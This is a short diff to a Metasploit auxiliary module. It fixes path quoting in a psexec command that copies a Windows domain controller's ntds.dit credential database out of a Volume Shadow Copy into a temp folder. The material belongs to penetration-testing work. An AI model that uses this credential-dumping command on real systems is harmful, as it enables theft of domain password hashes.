@@ -165,7 +165,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try to copy ntds.dit from VSC
 			ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
-			command = "%COMSPEC% /C copy /Y" + " #{ntdspath}" + " %WINDIR%\\Temp\\ntds"
+			command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
 			return psexec(command)
 		rescue StandardError => ntdscopyerror
 			print_error("Unable to copy ntds.dit from Volume Shadow Copy.  Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
